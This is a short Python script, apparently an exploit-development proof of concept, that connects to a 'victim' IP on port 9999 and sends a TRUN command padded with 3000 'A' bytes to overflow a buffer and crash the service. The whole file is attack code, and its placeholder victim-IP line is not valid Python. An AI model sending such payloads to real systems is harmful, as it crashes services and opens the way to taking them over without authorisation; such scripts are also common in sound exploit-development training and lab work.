import os  
import socket

buff = b'A' * 3000                   ## Sending 3000 * A Characters
victim_ip = //Enter victim IP HERE//

# Create the socket
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((victim_ip,9999))
print(s.recv(1024))
s.send(b'TRUN /.:/'+buff)
print(str(s.recv(1024)))
s.close()

